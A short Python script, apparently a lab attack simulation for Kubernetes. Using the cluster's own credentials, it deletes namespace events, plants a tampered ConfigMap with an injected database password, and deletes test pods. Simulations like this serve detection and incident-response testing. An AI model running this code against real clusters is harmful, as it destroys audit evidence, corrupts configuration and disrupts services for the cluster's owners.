from kubernetes import client, config
import time

def load_config():
    try:
        config.load_incluster_config()
    except:
        config.load_kube_config()

def attack_delete_events(namespace="default"):
    print("\n[ATTACK] Scenario 1: Deleting Kubernetes events...")
    v1 = client.CoreV1Api()
    events = v1.list_namespaced_event(namespace=namespace)
    deleted = 0
    for event in events.items:
        try:
            v1.delete_namespaced_event(name=event.metadata.name, namespace=namespace)
            deleted += 1
        except Exception as e:
            print(f"[ATTACK] Could not delete: {e}")
    print(f"[ATTACK] Deleted {deleted} events")
    return deleted

def attack_modify_configmap(namespace="default"):
    print("\n[ATTACK] Scenario 2: Creating malicious ConfigMap...")
    v1 = client.CoreV1Api()
    configmap = client.V1ConfigMap(
        metadata=client.V1ObjectMeta(name="tampered-config"),
        data={"db_password": "INJECTED_BY_ATTACKER", "malicious": "true"}
    )
    try:
        v1.create_namespaced_config_map(namespace=namespace, body=configmap)
        print("[ATTACK] Malicious ConfigMap created")
    except:
        v1.patch_namespaced_config_map("tampered-config", namespace, configmap)
        print("[ATTACK] Malicious ConfigMap updated")

def attack_delete_pods(namespace="default", label_selector="app=nginx-test"):
    print(f"\n[ATTACK] Scenario 3: Deleting pods...")
    v1 = client.CoreV1Api()
    pods = v1.list_namespaced_pod(namespace=namespace, label_selector=label_selector)
    deleted = 0
    for pod in pods.items:
        try:
            v1.delete_namespaced_pod(name=pod.metadata.name, namespace=namespace)
            print(f"[ATTACK] Deleted pod: {pod.metadata.name}")
            deleted += 1
        except Exception as e:
            print(f"[ATTACK] Error: {e}")
    print(f"[ATTACK] Deleted {deleted} pods")
    return deleted

if __name__ == "__main__":
    load_config()
    print("=" * 50)
    print("[ATTACK] Starting attack simulation")
    print("=" * 50)
    attack_delete_events()
    time.sleep(2)
    attack_modify_configmap()
    time.sleep(2)
    attack_delete_pods()
    print("\n[ATTACK] Attack simulation complete.")
